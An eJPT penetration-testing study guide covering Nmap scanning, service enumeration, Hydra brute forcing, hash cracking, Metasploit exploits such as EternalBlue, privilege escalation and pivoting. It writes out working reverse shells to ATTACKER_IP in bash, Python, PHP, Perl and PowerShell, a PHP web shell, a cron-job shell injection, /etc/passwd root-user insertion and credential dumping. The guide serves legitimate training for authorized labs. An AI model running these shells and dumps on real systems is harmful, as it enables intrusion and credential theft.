# Preface

## What eJPT actually is

eJPT is your entry point into offensive security. Unlike CompTIA Security+ (defensive + theory-heavy), eJPT proves you can **actually run a pentest engagement**: enumerate targets, exploit real vulnerabilities, pivot through networks, and document findings.

The exam drops you into a **live lab environment** with 5+ real machines on a network. You answer 35 scenario-based questions by **actually hacking the lab** — the answers come from your findings. It's 100% open-book. You can use notes, cheatsheets, Google, anything. But you still need to understand your tools well enough to work efficiently within 48 hours.

## Exam facts

| Item | Detail |
|---|---|
| Provider | INE Security (formerly eLearnSecurity) |
| Format | Hands-on live lab + 35 scenario-based questions |
| Time | 48 hours |
| Passing score | 70% — 25 out of 35 questions correct |
| Cost | $249 USD (voucher) or included with INE Starter Pass (~$299/yr) |
| Retakes | 1 free retake within 14 days of a failed attempt |
| Validity | 3 years |
| Open-book | Yes — all notes, cheatsheets, internet access allowed |

## Domain weights

| Domain | Weight |
|---|---|
| Assessment Methodologies | 25% |
| Host and Networking Auditing | 25% |
| Host and Network Penetration Testing | 35% |
| Web Application Penetration Testing | 15% |

## 4-week study plan

| Week | Focus |
|---|---|
| 1 | Networking foundations + Nmap + passive/active recon |
| 2 | Service enumeration + Metasploit + password attacks |
| 3 | Exploitation + privilege escalation + pivoting |
| 4 | Web app attacks + TryHackMe "Jr Pentester" path + full lab run |

## Essential tools (install all of these in Kali Linux)

| Tool | Purpose | Must know |
|---|---|---|
| Nmap | Port scanning + service detection | Yes — on every question |
| Metasploit (msfconsole) | Exploitation framework | Yes — central to exam |
| Netcat (nc) | Raw TCP connections, shells | Yes |
| Hydra | Network brute force | Yes |
| John / Hashcat | Offline hash cracking | Yes |
| Gobuster | Web directory enumeration | Yes |
| SQLmap | Automated SQL injection | Yes |
| Burp Suite Community | HTTP proxy, web testing | Yes |
| Searchsploit | Search ExploitDB offline | Yes |
| enum4linux-ng | Windows/SMB enumeration | Yes |
| Crackmapexec (netexec) | SMB/network enumeration | Recommended |
| Wireshark | Packet capture | Helpful |

> **Exam Tip:** The eJPT lab is open-book and 48 hours. The enemy is not time — it's being disorganized. Read the Letter of Engagement first. Enumerate everything before exploiting anything. Document every finding as you go.

<div style="page-break-after: always;"></div>

# Foundation: Networking Concepts for Pentesters

> **Why you need this:** Before you can hack anything, you must understand what you're looking at. Every pentest starts with a network. If you don't know ports, subnets, or TCP/IP, Nmap output means nothing to you.

## What is a port?

Think of an IP address as a building address and **ports** as room numbers. When a service runs on a machine, it "listens" on a specific port number.

- Your machine has **65,535 ports** (port 0 is reserved, ports 1–1023 are well-known)
- TCP vs UDP: TCP = reliable, connection-oriented (3-way handshake). UDP = fast, no handshake, no guaranteed delivery.
- A machine can have many services running simultaneously — each on a different port.

```
IP: 192.168.1.100
Port 22  → SSH service listening here
Port 80  → Web server (HTTP) listening here
Port 445 → SMB (file sharing) listening here
Port 3306 → MySQL database listening here
```

## Common ports you MUST know cold

| Port | Protocol | Service | Attack surface |
|---|---|---|---|
| 21 | TCP | FTP | Anonymous login, brute force |
| 22 | TCP | SSH | Brute force, key theft |
| 23 | TCP | Telnet | Unencrypted, credentials in cleartext |
| 25 | TCP | SMTP | Email enumeration, relay abuse |
| 53 | UDP/TCP | DNS | Zone transfer, DNS amplification |
| 80 | TCP | HTTP | Web attacks (SQLi, XSS, LFI, etc.) |
| 110 | TCP | POP3 | Email access, credential brute force |
| 139 | TCP | NetBIOS | SMB-related enumeration |
| 143 | TCP | IMAP | Email access |
| 443 | TCP | HTTPS | Web attacks over TLS |
| 445 | TCP | SMB | File shares, EternalBlue, credential attacks |
| 1433 | TCP | MSSQL | SQL injection, brute force |
| 3306 | TCP | MySQL | SQL injection, brute force |
| 3389 | TCP | RDP | Brute force, BlueKeep |
| 5432 | TCP | PostgreSQL | SQL attacks |
| 8080 | TCP | HTTP-alt | Web app, often admin panels |
| 8443 | TCP | HTTPS-alt | Web app over TLS |

## IP addressing and subnets (essential for pivoting)

```
IP address:  192.168.1.105
Subnet mask: /24 = 255.255.255.0
This means: the network contains 192.168.1.0 to 192.168.1.255 (256 hosts)

/24 = 256 hosts in the range (192.168.x.0 - 192.168.x.255)
/16 = 65,536 hosts (192.168.0.0 - 192.168.255.255)
/8  = 16,777,216 hosts (10.0.0.0 - 10.255.255.255)

Common private IP ranges (you'll see these in labs):
10.0.0.0/8        — large private network
172.16.0.0/12     — medium private
192.168.0.0/16    — small private (most home/lab networks)
```

## The TCP 3-way handshake (why it matters for scanning)

```
Client → Server: SYN          (I want to connect)
Server → Client: SYN-ACK      (OK, I acknowledge)
Client → Server: ACK          (Great, connection established)

→ Nmap SYN scan (-sS): sends SYN, reads response, never completes handshake
  = "half-open" scan. Less logged. Requires root/sudo.

→ Nmap TCP connect (-sT): completes full 3-way handshake
  = Fully logged. No root needed. This is Nmap's default WITHOUT root.
```

<div style="page-break-after: always;"></div>

# Domain 1: Assessment Methodologies (25%)

## 1.1 Penetration Testing Phases

Every pentest follows the same phases. Skipping enumeration and going straight to exploitation = missing machines = losing points.

```
1. RECONNAISSANCE     → Collect info without (or before) touching the target
2. SCANNING           → Actively probe ports and services
3. ENUMERATION        → Extract details from discovered services (users, shares, versions)
4. EXPLOITATION       → Use vulnerabilities to gain access
5. POST-EXPLOITATION  → What can you do now? Escalate, pivot, extract data
6. REPORTING          → Document everything with evidence
```

## 1.2 Passive Reconnaissance (OSINT — no direct contact)

```bash
# WHOIS — who registered this domain?
whois target.com

# DNS records — what's the network topology?
nslookup target.com
dig target.com              # A record (IPv4)
dig target.com MX           # Mail servers
dig target.com NS           # Name servers
dig target.com TXT          # SPF, DKIM, verification records
host -t any target.com      # all record types

# DNS zone transfer — often misconfigured on old servers
dig axfr @ns1.target.com target.com
fierce --domain target.com

# Subdomain enumeration
sublist3r -d target.com
amass enum -d target.com
# Online: crt.sh (search SSL certificate transparency logs), dnsdumpster.com

# Google Dorking (finding sensitive info via search engine)
site:target.com                          # all indexed pages
site:target.com filetype:pdf            # PDF documents
site:target.com inurl:admin             # admin paths
site:target.com inurl:login             # login pages
intitle:"index of" site:target.com      # directory listings
site:target.com filetype:sql            # SQL files exposed
```

## 1.3 Active Reconnaissance (direct contact with target)

```bash
# Ping sweep — which hosts are alive?
nmap -sn 192.168.1.0/24              # host discovery, no port scan
fping -a -g 192.168.1.0/24 2>/dev/null  # faster than nmap ping sweep

# ARP scan — works even when ICMP/ping is blocked (local network only)
netdiscover -i eth0 -r 192.168.1.0/24
arp-scan --localnet

# Traceroute — map the network path to target
traceroute target.com
```

<div style="page-break-after: always;"></div>

# Domain 2: Host and Networking Auditing (25%)

## 2.1 Nmap — The Core Scanning Tool ⭐

Nmap is the most important tool in the eJPT exam. You will use it on every single machine. Know every flag.

> **Important distinction:** Without root/sudo, Nmap defaults to **TCP Connect (-sT)** — a full 3-way handshake, always logged. With root/sudo, Nmap defaults to **SYN scan (-sS)** — half-open, less logged. In your Kali lab, you typically run as root, so SYN is the default.

```bash
# ── SCAN TYPES ──────────────────────────────────────────────────────────────

nmap <target>            # Default: SYN scan (root) or TCP Connect (no root), top 1000 ports
nmap -sS <target>        # SYN scan — half-open, faster, less logged (requires root/sudo)
nmap -sT <target>        # TCP Connect — full 3-way handshake, no root needed, always logged
nmap -sU <target>        # UDP scan — slow but finds UDP services (DNS, SNMP, TFTP)
nmap -sN <target>        # NULL scan — no flags set, may bypass simple firewalls
nmap -sF <target>        # FIN scan — only FIN flag, may bypass simple firewalls
nmap -sX <target>        # Xmas scan — FIN+PSH+URG flags set

# ── DETECTION FLAGS ─────────────────────────────────────────────────────────

nmap -sV <target>        # Version detection — what version is that service?
nmap -sC <target>        # Default scripts — auto-run common NSE scripts
nmap -O <target>         # OS detection (requires root)
nmap -A <target>         # Aggressive: -sV + -sC + -O + traceroute (all at once)

# ── PORT SELECTION ──────────────────────────────────────────────────────────

nmap -p 22,80,443 <target>      # specific ports only
nmap -p 1-1000 <target>         # range
nmap -p- <target>               # ALL 65535 ports (slow but thorough)
nmap --top-ports 100 <target>   # top 100 most common ports

# ── TIMING TEMPLATES ────────────────────────────────────────────────────────
# T0=Paranoid (slowest), T1=Sneaky, T2=Polite, T3=Normal, T4=Aggressive, T5=Insane

nmap -T0 <target>        # Paranoid — slowest, maximally stealthy (IDS evasion)
nmap -T1 <target>        # Sneaky — very slow, stealthy
nmap -T2 <target>        # Polite — slow, less network load
nmap -T3 <target>        # Normal — default speed
nmap -T4 <target>        # Aggressive — faster, slightly noisier (good for labs)
nmap -T5 <target>        # Insane — very fast, unreliable, very noisy

# ── OUTPUT FORMATS ──────────────────────────────────────────────────────────

nmap -oN output.txt <target>    # Normal text (human-readable)
nmap -oX output.xml <target>    # XML (parse with tools)
nmap -oG output.gnmap <target>  # Grepable format
nmap -oA output <target>        # All three formats simultaneously (saves output.txt, .xml, .gnmap)

# ── GOLDEN COMBINATIONS ⭐ ──────────────────────────────────────────────────

# Full scan — use this on every target, let it run while you work on other machines
nmap -sV -sC -p- -T4 -oA full_scan 192.168.1.100

# Quick scan to get an overview fast
nmap -sV -T4 --top-ports 1000 192.168.1.0/24

# Targeted service scan once you know the interesting ports
nmap -sV -sC -p 22,80,445,3306 192.168.1.100

# NSE vulnerability scripts
nmap -sV --script=vuln 192.168.1.100           # run ALL vulnerability scripts
nmap --script=smb-vuln-ms17-010 -p 445 target  # check for EternalBlue specifically
nmap --script=ftp-anon -p 21 target            # check anonymous FTP login
nmap --script=http-title -p 80,8080 target     # get web page titles
nmap --script=ssh-auth-methods -p 22 target    # check supported SSH auth methods
```

## 2.2 Service Enumeration — Going Deeper

Once Nmap shows you what ports are open, you go deeper into each service.

### FTP (port 21) — File Transfer Protocol

```bash
# Step 1: Check if anonymous login is allowed
nmap --script=ftp-anon -p 21 <target>

# Step 2: Connect and try anonymous login
ftp <target>
# When prompted:
# Username: anonymous
# Password: (anything, often your email or just press Enter)

# If you're in:
ftp> ls -la            # list all files including hidden
ftp> get filename      # download a file
ftp> put filename      # upload a file (if writable)
ftp> binary            # switch to binary mode for non-text files
ftp> bye               # disconnect

# Step 3: Brute force if anon fails (only if in scope!)
nmap --script=ftp-brute -p 21 <target>
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://target
```

### SSH (port 22) — Secure Shell

```bash
# Connect
ssh user@target
ssh -p 2222 user@target           # non-standard port
ssh -i id_rsa user@target         # using a private key file

# Banner grab — check version for known vulnerabilities
nc -nv target 22
nmap --script=ssh-hostkey -p 22 target
nmap --script=ssh-auth-methods -p 22 target

# Brute force (only if authorized!)
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target
hydra -L users.txt -P passwords.txt ssh://target

# Check for weak keys or default credentials
nmap --script=ssh2-enum-algos -p 22 target
```

### Telnet (port 23) — Cleartext Remote Access

```bash
# Just connect — often finds routers, old systems, or IoT with default creds
telnet target 23

# Banner grab
nc -nv target 23

# Brute force
hydra -l admin -P rockyou.txt telnet://target
```

### SMTP (port 25) — Mail Server

```bash
# Enumerate valid email users (VRFY and EXPN commands)
nmap --script=smtp-enum-users -p 25 target
nmap --script=smtp-commands -p 25 target

# Manual connection
nc -nv target 25
EHLO test
VRFY root            # check if user 'root' exists
VRFY admin
EXPN root            # expand mailing list
QUIT
```

### SMB (ports 139/445) — Windows File Sharing ⭐

```bash
# Null session enumeration (no credentials)
smbclient -L //target -N              # list shares, -N = no password
smbclient //target/sharename -N       # connect to specific share
enum4linux -a target                   # comprehensive enumeration (legacy)
enum4linux-ng -A target               # newer version, better output

# netexec (modern replacement for crackmapexec)
netexec smb target                     # basic info
netexec smb target -u '' -p ''         # null session
netexec smb target -u 'guest' -p ''   # guest session
netexec smb target --shares            # enumerate shares

# crackmapexec (if netexec not available)
crackmapexec smb target
crackmapexec smb target -u '' -p '' --shares

# Nmap SMB scripts ⭐
nmap --script=smb-enum-shares,smb-enum-users -p 445 target
nmap --script=smb-vuln-ms17-010 -p 445 target   # EternalBlue check
nmap --script=smb-vuln-* -p 445 target           # ALL SMB vulnerability checks

# Connect and browse a share
smbclient //192.168.1.100/shared
smb> ls
smb> get file.txt
smb> put local_file.txt

# Mount SMB share
mount -t cifs //target/share /mnt/smb -o username=guest,password=
```

### HTTP/HTTPS (ports 80/443/8080) ⭐

```bash
# Technology fingerprinting — what's running?
whatweb http://target
curl -I http://target                  # just headers, not body
curl -L http://target                  # follow redirects
nmap --script=http-headers,http-title -p 80 target

# Directory and file enumeration ⭐
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,asp,aspx -t 50
dirb http://target /usr/share/wordlists/dirb/common.txt

# Nikto — web server vulnerability scanner
nikto -h http://target
nikto -h https://target -ssl

# Always check manually:
curl http://target/robots.txt          # disallowed paths often = sensitive
curl http://target/sitemap.xml
# Also check: /admin, /login, /wp-admin, /phpmyadmin, /backup, /.git, /config, /api
```

### MySQL (port 3306)

```bash
# Try connecting with common defaults
mysql -h target -u root -p            # prompts for password
mysql -h target -u root               # try empty password
mysql -h target -u root --password='' # explicit empty

# If you get in:
show databases;
use database_name;
show tables;
select * from users;
select user,password from mysql.user;  # dump MySQL user hashes

# Nmap
nmap --script=mysql-info,mysql-empty-password -p 3306 target
nmap --script=mysql-brute -p 3306 target
```

### RDP (port 3389) — Windows Remote Desktop

```bash
# Check if open and get info
nmap --script=rdp-enum-encryption -p 3389 target

# Connect
xfreerdp /u:Administrator /p:password /v:target
xfreerdp /u:Administrator /p:'' /v:target      # try empty password

# Brute force
hydra -l Administrator -P rockyou.txt rdp://target
ncrack -u Administrator -P rockyou.txt rdp://target
```

## 2.3 Using Searchsploit ⭐

Once you know the service name and version from Nmap, use Searchsploit to find known public exploits **offline** (no internet needed during exam).

```bash
# Search by service name and version
searchsploit vsftpd 2.3.4           # FTP version
searchsploit openssh 7.2            # SSH version
searchsploit apache 2.4.49          # Apache web server version
searchsploit samba 3.5.0            # SMB/Samba version
searchsploit rejetto hfs 2.3        # HTTP File Server
searchsploit windows smb ms17       # Windows SMB EternalBlue

# Show the full path to the exploit file
searchsploit -p 39166               # show path for exploit #39166

# Copy exploit to current directory for modification
searchsploit -m exploits/linux/local/39166.c

# Update the database
searchsploit -u

# Search with exact string
searchsploit -e "vsftpd 2.3.4"

# Tip: After finding a match, search for it in Metasploit too:
# msfconsole → search vsftpd 2.3.4
```

## 2.4 Password Attacks

```bash
# ── WORDLISTS ───────────────────────────────────────────────────────────────
/usr/share/wordlists/rockyou.txt                              # 14M passwords — start here
/usr/share/wordlists/dirb/common.txt                          # web directories
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  # larger web dirs
/usr/share/seclists/                                          # install with: apt install seclists

# ── HYDRA — Online Network Brute Force ⭐ ────────────────────────────────────

# SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1
hydra -L users.txt -P passwords.txt ssh://192.168.1.1

# FTP
hydra -l admin -P rockyou.txt ftp://target

# HTTP POST form (correct syntax) ⭐
# Format: hydra -l USER -P WORDLIST TARGET http-post-form "PATH:PARAMS:FAIL_STRING"
hydra -l admin -P rockyou.txt target http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials"
hydra -l admin -P rockyou.txt target http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Login failed"
# F= means "failure" — what the page shows when login fails

# RDP
hydra -l Administrator -P rockyou.txt rdp://target

# MySQL
hydra -l root -P rockyou.txt mysql://target

# Multiple targets from file
hydra -l admin -P rockyou.txt -M targets.txt ssh

# ── IDENTIFY HASH TYPE ───────────────────────────────────────────────────────
hash-identifier           # interactive tool
hashid '<hash_string>'    # identify a specific hash

# ── JOHN THE RIPPER — Offline Hash Cracking ─────────────────────────────────
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --format=md5crypt hashes.txt          # specify format
john --format=NT hashes.txt                # NTLM hashes
john --show hashes.txt                     # show already-cracked passwords

# Convert /etc/shadow for John:
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=rockyou.txt

# ── HASHCAT — GPU-Based Cracking ────────────────────────────────────────────
hashcat -m 0    hash.txt rockyou.txt       # MD5
hashcat -m 100  hash.txt rockyou.txt       # SHA-1
hashcat -m 1000 hash.txt rockyou.txt       # NTLM (Windows)
hashcat -m 1800 hash.txt rockyou.txt       # sha512crypt (Linux /etc/shadow)
hashcat -m 3200 hash.txt rockyou.txt       # bcrypt
hashcat -m 1400 hash.txt rockyou.txt       # SHA-256
hashcat --show hash.txt                    # show cracked results
```

<div style="page-break-after: always;"></div>

# Domain 3: Host and Network Penetration Testing (35%)

## 3.1 Metasploit Framework ⭐

Metasploit is the exploitation engine for eJPT. The entire workflow: find service version → search module → configure → exploit → post-exploit.

```bash
# Start Metasploit
msfconsole
msfconsole -q    # quiet mode (no banner)

# ── USING THE DATABASE (store your recon) ─────────────────────────────────────
db_status                          # check database connection
workspace                          # list workspaces
workspace -a ejpt_exam             # create new workspace
db_nmap -sV -sC -p- 192.168.1.0/24  # run Nmap AND store results in db
hosts                              # see all discovered hosts
services                           # see all discovered services
services -p 445                    # filter by port
vulns                              # see identified vulnerabilities

# ── FINDING MODULES ─────────────────────────────────────────────────────────
search ms17-010                    # search by CVE or name
search type:exploit platform:windows name:smb
search vsftpd 2.3.4                # search by service + version
search rejetto                     # search by software name
info exploit/windows/smb/ms17_010_eternalblue  # detailed info about a module

# ── USING A MODULE ⭐ ────────────────────────────────────────────────────────
use exploit/windows/smb/ms17_010_eternalblue
show options               # show required and optional options
show payloads              # show compatible payloads

set RHOSTS 192.168.1.100   # target IP (or range: 192.168.1.0/24)
set RPORT 445              # target port (usually auto-set)
set LHOST 192.168.1.10     # YOUR IP (for reverse shells)
set LPORT 4444             # YOUR listening port
set PAYLOAD windows/x64/meterpreter/reverse_tcp

check                      # check if target is vulnerable (not always available)
run                        # run the exploit
exploit                    # same as run

# ── SESSIONS ────────────────────────────────────────────────────────────────
sessions                   # list all active sessions
sessions -l                # same as above
sessions -i 1              # interact with session 1
background                 # send current session to background (Ctrl+Z also works)
sessions -k 1              # kill session 1

# ── METERPRETER POST-EXPLOITATION ⭐ ─────────────────────────────────────────
sysinfo              # hostname, OS version, architecture
getuid               # who am I? (e.g., NT AUTHORITY\SYSTEM or john)
getpid               # current process ID
ps                   # list all running processes
migrate <PID>        # move to a different process (stabilize, elevate, hide)

getsystem            # attempt automatic privilege escalation (Windows)
hashdump             # dump local password hashes (requires SYSTEM)
run post/windows/gather/smart_hashdump  # better version of hashdump

shell                # drop into Windows cmd.exe shell
                     # Ctrl+Z to background the shell and return to Meterpreter

upload /local/path/file.exe C:\\Windows\\Temp\\file.exe  # upload to target
download C:\\Windows\\System32\\config\\SAM /tmp/        # download from target

ls, cd, pwd, mkdir, rm    # file system navigation in Meterpreter
cat C:\\Users\\john\\Desktop\\flag.txt                    # read file content
search -f flag.txt        # search for file by name
```

## 3.2 Common Exploits on eJPT

### MS17-010 (EternalBlue) — Windows 7/2008/2012 SMB ⭐

```bash
# Step 1: Verify vulnerability
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.100
run
# Or: nmap --script=smb-vuln-ms17-010 -p 445 target

# Step 2: Exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
run
# If it fails, try: set PAYLOAD windows/x64/shell/reverse_tcp
```

### vsftpd 2.3.4 Backdoor — Linux

```bash
# vsftpd 2.3.4 has a backdoor that opens a shell on port 6200
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS target
run
# You'll get a command shell (not Meterpreter)
```

### MS08-067 — Windows XP/2003 SMB

```bash
use exploit/windows/smb/ms08_067_netapi
set RHOSTS target
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST your_ip
run
```

### Rejetto HFS 2.3 — Windows HTTP File Server

```bash
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS target
set RPORT 8080         # or whatever port HFS runs on
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST your_ip
run
```

### DISTCCD — Linux Remote Code Execution

```bash
use exploit/unix/misc/distcc_exec
set RHOSTS target
set PAYLOAD cmd/unix/reverse_netcat
set LHOST your_ip
run
```

### PHP Web Shell Upload

```bash
# If you can upload files to a web server:
echo '<?php system($_GET["cmd"]); ?>' > shell.php
# Upload via FTP, web form, or other means
# Then access:
curl "http://target/uploads/shell.php?cmd=id"
curl "http://target/uploads/shell.php?cmd=whoami"
curl "http://target/uploads/shell.php?cmd=cat+/etc/passwd"
```

## 3.3 Shells and Netcat ⭐

A **shell** is a command-line session on the target machine. A **reverse shell** means the target connects back to you (better for bypassing firewalls). A **bind shell** means the target listens and you connect to it.

```bash
# ── SET UP YOUR LISTENER FIRST ───────────────────────────────────────────────
nc -lvnp 4444       # -l = listen, -v = verbose, -n = no DNS, -p = port
# Then trigger the reverse shell on the target

# ── BASH REVERSE SHELL (Linux) ──────────────────────────────────────────────
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
# Explanation: bash -i = interactive shell
# >& = redirect stdout and stderr
# /dev/tcp/IP/PORT = connect to IP:PORT
# 0>&1 = redirect stdin to stdout (so you can type commands)

# ── PYTHON REVERSE SHELLS ─────────────────────────────────────────────────────
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# ── PHP REVERSE SHELL ─────────────────────────────────────────────────────────
php -r '$sock=fsockopen("ATTACKER_IP",4444);$proc=proc_open("/bin/sh",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'

# ── PERL REVERSE SHELL ────────────────────────────────────────────────────────
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'

# ── POWERSHELL REVERSE SHELL (Windows) ────────────────────────────────────────
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "& {$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"

# ── UPGRADE SHELL TO INTERACTIVE TTY (Linux) ─────────────────────────────────
# After catching a basic shell, it won't have tab completion or arrow keys.
# Step 1: In your shell on target:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Step 2: On your machine press Ctrl+Z (backgrounds the shell)
# Step 3: On your machine:
stty raw -echo
# Step 4: Foreground the shell:
fg
# Step 5: In the shell:
export TERM=xterm
```

## 3.4 Privilege Escalation

Privilege escalation = you have low-privilege access, you want root/SYSTEM.

### Linux Privilege Escalation ⭐

```bash
# ── INITIAL RECON ────────────────────────────────────────────────────────────
id && whoami                          # who am I?
uname -a                              # kernel version (critical for kernel exploits)
cat /etc/os-release                   # OS version
cat /etc/passwd                       # list all users (look for ones with shells)
cat /etc/shadow                       # password hashes (need root to read)

# ── SUDO MISCONFIGURATIONS ────────────────────────────────────────────────────
sudo -l                               # what can I run as sudo?
# If output shows: (ALL) NOPASSWD: /usr/bin/vim
# → sudo vim → :!bash → you have root shell
# Reference: gtfobins.github.io for every binary that can be abused

# ── SUID BINARIES ─────────────────────────────────────────────────────────────
find / -perm -u=s -type f 2>/dev/null    # find files with SUID bit set
# SUID = run as file owner (often root), even if you're not root
# Check gtfobins.github.io for how to abuse: find, bash, vim, python, nmap, etc.
# Example: if /usr/bin/find has SUID:
/usr/bin/find . -exec /bin/bash -p \;    # get root shell

# ── WRITABLE /etc/passwd ──────────────────────────────────────────────────────
ls -la /etc/passwd       # if world-writable, add a root user
# Generate a password hash:
openssl passwd -1 hacked123        # outputs: $1$...hash...
# Add this line to /etc/passwd:
echo 'hacker:$1$generated_hash:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker                          # now switch to your new root user

# ── CRON JOBS ─────────────────────────────────────────────────────────────────
cat /etc/cron*                    # all cron configurations
cat /var/spool/cron/crontabs/*    # user cron tabs
ls -la /etc/cron.d/               # cron.d directory
# If a root-owned cron job runs a script you can write to:
echo 'bash -i >& /dev/tcp/ATTACKER_IP/9999 0>&1' >> /path/to/script.sh

# ── INTERESTING FILES ─────────────────────────────────────────────────────────
find / -name "*.conf" -readable 2>/dev/null | head -20  # config files
find / -name "*.bak" 2>/dev/null | head -10              # backup files
find / -name "id_rsa" 2>/dev/null                        # SSH private keys
find / -name "*.txt" -readable 2>/dev/null | grep -i pass | head -10
grep -r "password" /etc/ 2>/dev/null | head -20
grep -r "password" /var/www/ 2>/dev/null | head -20      # web app config

# ── KERNEL EXPLOITS ───────────────────────────────────────────────────────────
uname -a                           # get kernel version
searchsploit linux kernel 3.13     # search for exploits for this version
# Example: DirtyCow (CVE-2016-5195) works on kernel < 4.8.3
```

### Windows Privilege Escalation ⭐

```bash
# ── INITIAL ENUMERATION (from Windows cmd/Meterpreter shell) ─────────────────
whoami                              # current user
whoami /all                         # user + groups + privileges (important!)
net user                            # list all local users
net user john                       # details about user 'john'
net localgroup                      # list all groups
net localgroup administrators       # who is in Administrators group?
systeminfo                          # OS version, patches, hotfixes
ipconfig /all                       # all network interfaces + IPs (check for dual-homed!)
netstat -ano                        # active connections and listening ports
tasklist                            # running processes
tasklist /v                         # verbose (includes user running each process)

# ── FROM METERPRETER ─────────────────────────────────────────────────────────
getsystem                                                    # automatic PrivEsc attempt
run post/multi/recon/local_exploit_suggester                 # find local exploits
run post/windows/gather/smart_hashdump                       # dump password hashes
run post/windows/gather/credentials/credential_collector     # find stored creds

# ── COMMON WINDOWS PRIVESC PATHS ──────────────────────────────────────────────
# 1. Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
# If path has spaces and no quotes: C:\Program Files\My App\service.exe
# → Place malicious binary at: C:\Program.exe

# 2. AlwaysInstallElevated (MSI packages run as SYSTEM)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both = 1 → create malicious MSI: msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f msi > evil.msi

# 3. Stored credentials
cmdkey /list                         # list stored credentials
# If credentials found: runas /savecred /user:admin cmd.exe

# 4. Juicy Potato / PrintSpoofer (SeImpersonatePrivilege)
whoami /priv | findstr SeImpersonatePrivilege
# If present → use JuicyPotato or PrintSpoofer for SYSTEM
```

## 3.5 Pivoting ⭐

**Pivoting** = using a compromised machine as a "bridge" to reach other networks you can't directly access.

```
Your machine → [Internet] → Machine A (192.168.1.100)
                             Machine A also has IP: 10.10.10.5
                             ↓ (pivot through Machine A)
                             Machine B (10.10.10.20) — only reachable FROM Machine A
```

```bash
# ── STEP 0: IDENTIFY DUAL-HOMED MACHINES ──────────────────────────────────────
# When you get a shell on a machine, ALWAYS check its network interfaces:
# Linux:
ip a                              # modern Linux command
ip route                          # routing table — shows connected networks
ifconfig                          # older Linux, still works
arp -a                            # ARP cache — shows other machines it's talked to

# Windows:
ipconfig /all                     # all interfaces
route print                       # routing table
arp -a                            # ARP cache

# If you see TWO IP addresses on different subnets → PIVOT OPPORTUNITY
# Example output: eth0: 192.168.1.100  AND  eth1: 10.10.10.5
# → Machine is dual-homed, you can reach 10.10.10.0/24 through it

# ── METHOD 1: METASPLOIT ROUTE (via Meterpreter session) ─────────────────────
# Add a route through your existing Meterpreter session
route add 10.10.10.0/24 1         # route 10.10.10.0/24 through session 1

# Then scan through the pivot:
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
set PORTS 22,80,445,3389
run

# Set up a SOCKS proxy for full tool support:
use auxiliary/server/socks_proxy
set VERSION 5
set SRVPORT 1080
run -j

# Configure proxychains (edit /etc/proxychains4.conf):
# At the bottom add: socks5 127.0.0.1 1080

# Now use any tool through proxychains:
proxychains nmap -sT -p 22,80,445 10.10.10.20   # -sT required (not -sS) through proxy
proxychains curl http://10.10.10.20
proxychains smbclient -L //10.10.10.20

# ── METHOD 2: SSH DYNAMIC PORT FORWARDING (if you have SSH to pivot host) ────
ssh -D 1080 -N -f user@pivot_host_ip
# -D 1080 = create SOCKS proxy on your local port 1080
# -N = don't execute command (just tunnel)
# -f = run in background

# Then use proxychains exactly as above

# ── METHOD 3: SSH LOCAL PORT FORWARD ─────────────────────────────────────────
# Access a specific service on the internal network through the pivot
ssh -L 8080:internal_server_ip:80 user@pivot_ip
# → Now http://localhost:8080 reaches http://10.10.10.20:80

ssh -L 3307:10.10.10.20:3306 user@pivot_ip
# → Now mysql -h 127.0.0.1 -P 3307 reaches the remote MySQL

# ── METHOD 4: SOCAT (if SSH not available, no Metasploit) ────────────────────
# On the pivot host (e.g., using a shell you have):
socat TCP-LISTEN:8080,fork TCP:10.10.10.20:80
# → Traffic to pivot_ip:8080 is forwarded to internal_server:80
```

